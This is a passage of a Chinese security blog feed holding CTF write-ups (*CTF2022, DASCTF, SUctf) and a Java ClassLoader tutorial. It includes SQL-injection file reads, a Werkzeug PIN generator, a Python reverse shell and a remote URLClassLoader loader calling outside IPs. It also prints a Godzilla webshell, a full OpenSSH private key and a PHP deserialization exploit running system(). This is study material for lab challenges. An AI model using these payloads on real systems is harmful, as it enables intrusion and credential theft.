or in profile settings admin_password = 5f989714e132c9b04d4807dafeb10ade   进去后可以执行sql语句 查一下表名 拿flag oh-my-lotto 主要思路就是：\n首先是随便摸一个奖，然后在result路由里面获得了结果，是上一轮的\n正常情况下，你再次去摸奖，他会wget不改变名字的去下载乐透结果，也就等同于更新一次乐透结果，也就是这个代码\n1  os.system(\u0026#39;wget --content-disposition -N lotto\u0026#39;)   但是在此之前，有这么一句代码\n1 2 3 4  lotto_key = request.form.get(\u0026#39;lotto_key\u0026#39;) or \u0026#39;\u0026#39; lotto_value = request.form.get(\u0026#39;lotto_value\u0026#39;) or \u0026#39;\u0026#39; os.environ[lotto_key] = lotto_value   这里我们可以操作lotto_key和lotto_value\n那么就可以把path改掉，让他执行不了wget命令，这样的话，/app/lotto_result.txt就和上一局是一样的\n这样的话，我们再把上一次的乐透结果传上去，这样就能判断相等，获取flag\n1 2 3 4 5  if os.path.exists(\u0026#34;/app/guess/forecast.txt\u0026#34;): forecast = open(\u0026#34;/app/guess/forecast.txt\u0026#34;, \u0026#39;rb\u0026#39;).read() if forecast == lotto_result: return flag   然后访问lotto路由拿到flag\n注意有个坑，乐透结果之间是换行，所以文件构造的也应该是换行 oh-my-note admin:admin进入后台 在view note处存在sql注入，基本没有过滤，而且开启了debug\n1  http://124.70.185.87:5002/view?note_id=pt8q0tub5k59zh9b4hc5te6kdc6vjyn3%27   开了debug，需要构造pin码，利用sql注入进行文件读取 payload如下\n1 2  \u0026#39;;create table fxz1(data text);# 读取mac地址/sys/class/net/eth0/address、/etc/machine-id、/proc/self/cgroup   load data 写入创建的表 /etc/machine-id一般固定 1cc402dd0e11d5ae18db04a6de87223d\n1 2  \u0026#39;;LOAD DATA LOCAL INFILE \u0026#34;/sys/class/net/eth0/address\u0026#34; INTO TABLE fxz1;# \u0026#39;;LOAD DATA LOCAL INFILE \u0026#34;/proc/self/cgroup\u0026#34; INTO TABLE fxz2;#   查看结果\n1  \u0026#39; union select 1,2,3,4,(select(group_concat(data))from(fxz1))#   构造pin生成脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  #sha1 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;ctf\u0026#39;# /etc/passwd \u0026#39;flask.app\u0026#39;,# 默认值 \u0026#39;Flask\u0026#39;,# 默认值 \u0026#39;/usr/local/lib/python3.8/site-packages/flask/app.py\u0026#39; # 报错得到 ] private_bits = [ \u0026#39;xxx\u0026#39;,# /sys/class/net/eth0/address 16进制转10进制 \u0026#39;xxxxxx\u0026#39;# /etc/machine-id+/proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) cookie_name = \u0026#39;__wzd\u0026#39; + h.hexdigest()[:20] num = None if num is None: h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv)   587-976-623 进去console用python反弹shell，到根目录执行/readflag\n1 2 3 4  import os,pty,socket s=socket.socket() s.connect((\u0026#34;101.35.***\u0026#34;,8866)) [os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;sh\u0026#34;)   Misc today “I’m anninefour. I love machine learning and data science. Flag is in my pocket!” 名字是anninefour，喜欢机器学习和数据科学，那么可以去各大机器学习平台社区搜搜这个人 在kaggle里面找到了这个人 https://www.kaggle.com/anninefour 绑定了一个推特 到了一个图片 看到对面有一个农夫果品生鲜超市 去高德搜了一下，全称直接搜没搜到，搜一半农夫果品，发现集中在上海，貌似是上海连锁，而且图片能非常相似的对上 在上海区域搜农夫果品生鲜超市，只有一个能完全对应上名字 拍照的小区在对面，叫花山名苑 在google地图评论里找到了flag\n","date":"2022-04-17T18:29:06+08:00","permalink":"https://example.com/post/ctf2022_wp/","title":"[*CTF2022] WP"},{"content":"前言 借用了先知社区的文章的一张图来解释这个原理\n负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。\n类加载器介绍 类加载器大致分为两类：\n JVM 默认类加载器 用户自定义类加载器  类加载器分类  引导类加载器(BootstrapClassLoader)：属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中、 扩展类加载器(ExtensionsClassLoader)：sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库 系统类加载器(AppClassLoader)：由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它 自定义类加载器(UserDefineClassLoader)：这个就是由用户自定义的类加载器  ClassLoader类核心方法 除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。\nloadClass：加载指定的java类 加载名称为name的类，返回的结果是java.lang.Class类的实例\n可以看loadClass的源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  protected Class\u0026lt;?\u0026gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded  Class\u0026lt;?\u0026gt; c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found  // from the non-null parent class loader  } if (c == null) { // If still not found, then invoke findClass in order  // to find the class.  long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats  sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } }   先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求\nfindCLass：查找指定的Java类 1 2 3  protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); }   findLoadedClass：查找JVM已经加载过的类 1 2 3 4 5  protected final Class\u0026lt;?\u0026gt; findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); }   defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 1 2 3 4 5  protected final Class\u0026lt;?\u0026gt; defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); }   resolveClass：链接指定Java类 1 2 3 4 5  protected final void resolveClass(Class\u0026lt;?\u0026gt; c) { resolveClass0(c); } private native void resolveClass0(Class c);   自定义的类加载器 那么我们如果要自定义类加载器，那么就要进行如下步骤：\n 继承ClassLoader类 重载fandClass方法 利用defineClass方法将字节码转换成java.lang.class类对象  代码示例 messageTest\n1 2 3 4 5 6  public class messageTest { public static void main(String[] args){ System.out.println(\u0026#34;This is the secret!\u0026#34;); } }   对class文件加密的类 encodeTest\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import java.io.*; public class encodeTest { public static void main(String[] args) throws IOException { encode( new File(\u0026#34;../out/production/Classloader/messageTest.class\u0026#34;), new File(\u0026#34;../out/production/Classloader/test/messageTest.class\u0026#34;) ); } public static void encode(File src, File out) throws IOException { FileInputStream fin; FileOutputStream fout; fin = new FileInputStream(src); fout = new FileOutputStream(out); int temp = -1; while ((temp = fin.read()) != -1) {// 读取一个字节  fout.write(temp ^ 0xff);// 取反输出  } fin.close(); fout.close(); } }   再写解密类，重写findclass方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class decodeTest extends ClassLoader{ private String rootDir; public decodeTest(String rootDir) { this.rootDir = rootDir; } // 解密文件  public byte[] getClassData(String className) throws IOException { String path = rootDir + \u0026#34;/\u0026#34; + className.replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;) + \u0026#34;.class\u0026#34;; // 将流中的数据转换为字节数组  InputStream is = null; ByteArrayOutputStream baos = new ByteArrayOutputStream(); is = new FileInputStream(path); byte[] buffer = new byte[1024]; int temp = -1; while ((temp = is.read()) != -1) { baos.write(temp ^ 0xff); } return baos.toByteArray(); } @Override // 重写覆盖findClass  protected Class\u0026lt;?\u0026gt; findClass(String className) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; c = findLoadedClass(className); if (c != null) { return c; } else { ClassLoader parent = this.getParent(); c = parent.loadClass(className); if (c != null) { System.out.println(\u0026#34;父类成功加载\u0026#34;); return c; } else {// 读取文件 转化成字节数组  byte[] classData = new byte[0]; try { classData = getClassData(className); } catch (IOException e) { e.printStackTrace(); } if (classData == null) { throw new ClassNotFoundException(); } else { // 调用defineClass()方法  c = defineClass(className, classData, 0, classData.length); return c; } } } } }   再写测试类\n1 2 3 4 5 6 7 8 9 10  public class loadClassTest { public static void main(String[] args) throws ClassNotFoundException { decodeTest de = new decodeTest(\u0026#34;/Users/liucheng/Desktop/JavaSec/out/production/Classloader/test/\u0026#34;); Class\u0026lt;?\u0026gt; a = de.loadClass(\u0026#34;messageTest\u0026#34;); System.out.println(a); } }   由于我指定的class文件是加密后的class文件，所以java自带的类加载器就加载不了，这里我们成功用自定义的类加载器去解密加载到了messageTest\nURLClassLoader URLClassLoader是ClassLoader的一个实现，拥有远程服务器上加载类的能力，通过这个URLClassLoader可以实现对一些webshell的远程加载\n这里举个例子 我在Tomcat服务器处生成一个执行系统命令的class\n1 2 3 4 5 6 7 8 9 10 11  public class Test { public static void main(String[] args){ try{ Runtime.getRuntime().exec(\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); } catch(Exception e) { e.printStackTrace(); } } }   然后在项目里远程加载这个类\n1 2 3 4 5 6 7 8 9 10 11 12 13  import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class URLClassLoaderTest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL url = new URL(\u0026#34;http://101.35.98.118:12424/javatest/\u0026#34;); URLClassLoader cl = new URLClassLoader(new URL[]{url}); Class c = cl.loadClass(\u0026#34;Test\u0026#34;); c.newInstance(); } }   ","date":"2022-03-30T19:17:18+08:00","permalink":"https://example.com/post/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/","title":"[Java安全]类加载器ClassLoader"},{"content":"Misc Hi hacker 下载到是一个流量包，分析tcp流，发现是一个后面执行命令的\n这里有一个文件jenkins_secret.zip\n看下一个包里面，他进行了这样的操作\n这看起来像是把文件发送的一个作用\n分析icmp协议，找到这个secret文件\n压缩文件是损坏的\nbinwalk分离一些，修复一下压缩包，总共就弄到了这些东西，还差了一些xml文件\n这些应该是什么某种加密 这个是java的一个类似于插件的一个东西\n1  org.jenkinsci.main.modules.instance_identity   github：https://github.com/jenkinsci/instance-identity-plugin\n在github搜了一下，找到了几个对应的文件\n找到了一个jenkins的解密的一个项目 https://github.com/hoto/jenkins-credentials-decryptor\n这几个文件在流量包里都能找到，但是xml文件一直提取不出来 他发送是只是一个数据包，但是这里他分了四块去传输，这样数据混乱了，我无法将他们重新拼接起来，不知道是从哪里断的 找了一下规律，第一个应该是由PK来开头的，猜测数据应该是由这里开始\n每一个文件结尾都有个，猜测也是icmp传输的某个格式文本\n而且只有最后第565个包里面是有压缩文件尾的，504b0506\n所以我猜测是四个拼接起来合成完整的zip文件 我尝试和了一下，用winrar修复了一下\n差一个global_config.xml，而且xml文件还是处于损坏状态，无法提取。。。 脱出四个分块，放一起对比一下，相同的尾\n拼了很久很久发现，漏了几个包 主要看这里\n过滤一下(icmp.ident == 135) \u0026amp;\u0026amp; (ip.src == 172.17.0.2) 把8个包的data流拿出来，去掉头部和尾部再拼接\n终于得到了完好的压缩包，xml文件算是拿到了\n然后就是用刚才的工具\n解密得到一个github是ssh私钥\n还有一个hint\n这里获取了ssh的私钥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----   流量包里面，第一个http流里面有这样的信息\n所以接下来的目标就是利用这个私钥去拉取这个仓库 把私钥文件丢到~./ssh里面 然后用私钥去生成一个公钥\n1  ssh-keygen -y -f id_rsa \u0026gt; id_rsa.pub   然后就可以clone了\n1  git clone Esonhugh@github:Esonhugh/secret_source_code.git   里面的文件就是http的第一个包的服务，没有flag，那就看一下git log，果然发现了端倪\n都看了一下，发现flag是在source1里面\nDASCTF{Oh!_H4ck_f0r_c0d3s-and_4buse_1t}\n月圆之夜 其实就是找一个映射的关系 比如机械师是mechanic，对应了他的字母，然后翻译出来对应回去就是了\nmechanic\nwerewolf\nmagician\nknight\nsoul hunter\nn\nwitch\nnun\napothecary\nRanger\n对比一下flag\ndasctf{welcometothefullmoonnight}\n什么奇奇怪怪的东西 打开有一个mrf文件，MRF 文件是由 Bartels Media Mouse Recorder 创建的数据文件\n还有一个flag.zip，里面有一个vhd文件，也被加密了\n在这里下载一个MouseRecorder https://www.macrorecorder.com/download/ 这里记录了一些鼠标操作记录\n打开画图，然后让他画出来 结果是397643258669\n用这个密码去解开压缩包，拿到vhd文件，挂载上以后，里面有这么些文件\nppt里面有这么一段字符\n1  9876543210/.-,+*)E\u0026#39;CB;:?\u0026gt;=\u0026lt;;4Xyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONML   xlsx里面的内容\n1  KJIHGFED`B^]V[TYXWVUNrLQJONMLKDh+*)(\u0026#39;\u0026amp;\u0026lt;A@?8=\u0026lt;;:92Vwvutsrqponmlkjihgfedcba`_^   txt里面的内容\n1  \u0026#39;\u0026amp;B$:?8=\u0026lt;;:3W76/4-Qrqponmlkjihgfedcbawv{zyxwvutsl2poQmle+LKJIHGcE[`YX]V[ZSw:   看这个图片的16进制，在末尾接了一段数据，是png的反转89054e74\n提取出来反转一下，解出来是半个二维码\n原png的文件名解码是flag4\nAu5t1n的秘密 中间有http流，貌似是扫描了一下目录\n在1994组里面，貌似是扫到了后台\n这里用admin:admin貌似登陆进去了\n进后台后进行了一个上传操作，这里提示了密钥是key is key1**\n传了文件名为key.php.mod 第二次上传\n内容是一个木马，didi.php，是一个哥斯拉马子，但是好像还改过\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  \u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;093c1c388069b7e1\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); eval($payload); echo encode(@run($data),$key); }else{ if (stripos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } }   继续往后翻，找到对这个后面的利用了\n被加密了，解一下哥斯拉的加密才行\n写一个脚本逆一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;?php function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;093c1c388069b7e1\u0026#39;; $data=\u0026#39;1d430243025e5d4c55444a5f56174351401b4a0a6e391c6763736a5f56174351401b4a0a6e395e4d5e554d0b580b11424c5d4b15135e4b114b3b3342174511425c7 。 。（省略） 。 70657304a4b4c555b7f1759061919023e69114f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2031390d0a0d0a545617590c5776595d533b66376531445c4017\u0026#39;; echo encode(hex2bin($data),$key);   解密拿到源码，这就是哥斯拉注入的一些东西，不用管\n1 2 3 4 5  $parameters=array(); $_SES=array(); function run($pms){ reDefSystemFunc(); $_SES=\u0026amp;getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1\u0026amp;\u0026amp;@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if 。 。（省略） 。 strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }   再看看他其他的操作，这个流里面就是一些加载配置的操作了 后面的包，流量就解不出了，不知道为啥 他们有一个特征就是都有一个这样的头\n我怀疑是不是有一个什么格式，后来去了解了一下哥斯拉的木马，发现在Godzillas v3.03以后对发送以及返回流量增加了gzip压缩，我把脚本一改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;093c1c388069b7e1\u0026#39;; $data=\u0026#39;\u0026#39;; echo bin2hex(encode(hex2bin($data),$key));   看一下文件头，哦豁，真是gzip压缩的格式\n这样就可以拉去gzip -d解压了\n解压出来，果然有数据！！\n然后就可以去试了\n在当前目录发现了flag.zip，时间还是2022的\n然后就是一个个的去试，在2079号包里面，找到了相关信息\n上面的解密得到，这是他文件上传的表单，我们就可以拿下这个flag.zip了\n但是他有一个密码，密码为password is md5(Godzilla' key)，那找key就是最后的一步了 key进行md5后的前16位为\n1  093c1c388069b7e1   写一个脚本爆破一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import string import hashlib def md5(s): return hashlib.md5(s.encode(encoding=\u0026#39;utf-8\u0026#39;)).hexdigest() s = string.printable k = \u0026#39;key1\u0026#39; for a in s: for b in s: for c in s: key = k+a+b+c if(md5(key)[0:16]==\u0026#34;093c1c388069b7e1\u0026#34;): print(key) break   md5加密以后解开压缩包拿到flag\n1  093c1c388069b7e18bb4e898fc5ee049   Web ezpop 题目给了如下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  \u0026lt;?php class crow { public $v1; public $v2; function eval() { echo new $this-\u0026gt;v1($this-\u0026gt;v2); } public function __invoke() { $this-\u0026gt;v1-\u0026gt;world(); } } class fin { public $f1; public function __destruct() { echo $this-\u0026gt;f1 . \u0026#39;114514\u0026#39;; } public function run() { ($this-\u0026gt;f1)(); } public function __call($a, $b) { echo $this-\u0026gt;f1-\u0026gt;get_flag(); } } class what { public $a; public function __toString() { $this-\u0026gt;a-\u0026gt;run(); return \u0026#39;hello\u0026#39;; } } class mix { public $m1; public function run() { ($this-\u0026gt;m1)(); } public function get_flag() { eval(\u0026#39;#\u0026#39; . $this-\u0026gt;m1); } }   入口的类肯定是fin，最后的目的肯定是在mix里面的get_flag方法里面去执行eval函数 get_flag的入口也在fin里面，是fin的__call函数，而能调用call的只有一个地方，就是crow的__invoke函数\n那能调用invoke的地方这里就有很多了 fin里面的run方法\n或者mix的run方法\n这里不知道从哪里开始分析，那就先看入口fin的__destruct函数，这里进行了一个字符串拼接，那么就是会触发一个__toString方法了 toString方法只有what有，那么f1的值就应该是what了\n这里进what的tostring以后会调用run方法，这里就有分支了，但是感觉两个都用得到，所以可能是利用了这个trick，[class,func]去跳转到crow的eval方法 一开始想着要把所有方法都连接上。所以这样想的\n1  new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),\u0026#34;eval\u0026#34;])))   但是发现tostring会比析构还先执行，导致打不通， 然后发现是不是我想复杂了，直接用这个小trick连上get_flag方法就能直接执行了。。。\n这里还耍我一轮\n写马写不了 直接看当前目录\n这里又耍我一轮 拿到flag 最后的poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  \u0026lt;?php class crow { public $v1; public $v2; public function __construct($a,$b){ $this-\u0026gt;v1 = $a; $this-\u0026gt;v2 = $b; } function eval() { echo new $this-\u0026gt;v1($this-\u0026gt;v2); } public function __invoke() { $this-\u0026gt;v1-\u0026gt;world(); } } class fin { public $f1; public function __construct($a){ $this-\u0026gt;f1 = $a; } public function __destruct() { echo $this-\u0026gt;f1 . \u0026#39;114514\u0026#39;; } public function run() { ($this-\u0026gt;f1)(); } public function __call($a, $b) { echo $this-\u0026gt;f1-\u0026gt;get_flag(); } } class what { public $a; public function __construct($a){ $this-\u0026gt;a = $a; } public function __toString() { $this-\u0026gt;a-\u0026gt;run(); return \u0026#39;hello\u0026#39;; } } class mix { public $m1; public function __construct($a){ $this-\u0026gt;m1 = $a; } public function run() { ($this-\u0026gt;m1)(); } public function get_flag() { eval(\u0026#39;#\u0026#39; .$this-\u0026gt;m1); } } #$ser = new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),\u0026#34;eval\u0026#34;]))); $ser = new fin(new what(new fin([new mix(\u0026#39;?\u0026gt;\u0026lt;?php system(\u0026#34;cat H0mvz*\u0026#34;);?\u0026gt;\u0026#39;),\u0026#39;get_flag\u0026#39;]))); echo urlencode(serialize($ser));   calc 题目给了源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  #coding=utf-8 from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory import random from urllib import parse import os from werkzeug.utils import secure_filename import time app=Flask(__name__) def waf(s): blacklist = [\u0026#39;import\u0026#39;,\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39; \u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;getattr\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;class\u0026#39;,\u0026#39;subclasses\u0026#39;,\u0026#39;mro\u0026#39;,\u0026#39;request\u0026#39;,\u0026#39;args\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;if\u0026#39;,\u0026#39;subprocess\u0026#39;,\u0026#39;file\u0026#39;,\u0026#39;open\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;builtins\u0026#39;,\u0026#39;compile\u0026#39;,\u0026#39;execfile\u0026#39;,\u0026#39;from_pyfile\u0026#39;,\u0026#39;config\u0026#39;,\u0026#39;local\u0026#39;,\u0026#39;self\u0026#39;,\u0026#39;item\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;getattribute\u0026#39;,\u0026#39;func_globals\u0026#39;,\u0026#39;__init__\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;__dict__\u0026#39;] flag = True for no in blacklist: if no.lower() in s.lower(): flag= False print(no) break return flag @app.route(\u0026#34;/\u0026#34;) def index(): \u0026#34;欢迎来到SUctf2022\u0026#34; return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/calc\u0026#34;,methods=[\u0026#39;GET\u0026#39;]) def calc(): ip = request.remote_addr num = request.values.get(\u0026#34;num\u0026#34;) log = \u0026#34;echo {0} {1} {2}\u0026gt; 